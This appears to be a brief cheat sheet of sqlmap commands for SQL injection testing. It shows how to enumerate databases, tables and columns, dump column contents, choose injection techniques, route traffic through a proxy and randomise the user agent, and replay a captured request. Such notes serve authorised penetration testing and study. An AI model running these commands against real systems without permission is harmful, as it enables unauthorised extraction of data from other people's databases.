# Sqlmap
## Dumping specific informatin from database
### Listing information about the existing databases 
DBMS databases enumeration:
```
sqlmap -u $ip --dbs 
```

### Listing information about tables present in a particular database
```
sqlmap -u $ip -D DatabaseName --tables 
```

### Listing information about the columns of a particular table
```
sqlmap -u $ip -D DatabaseName -T TableName --columns
```

### Dumping the data from particular column
```
sqlmap -u $ip -D DatabaseName -T TableName -C ColumnName --dump
```
## Providing specific information to sqlmap
```
--data "DataToBeSent"
-p ParameterToInjectTo
--dbms <DBMStype>
--proxy=PROXY
--random-agent
--technique=BEUSTQ
    B: Boolean-based blind
    E: Error-based
    U: Union query-based
    S: Stacked queries
    T: Time-based blind
    Q: Inline queries
```

## Exploitation via specific packet
```
# Copy request to file e.g req.txt
sqlmap -r req.txt -p VulnerableParameter --dbs
...
```


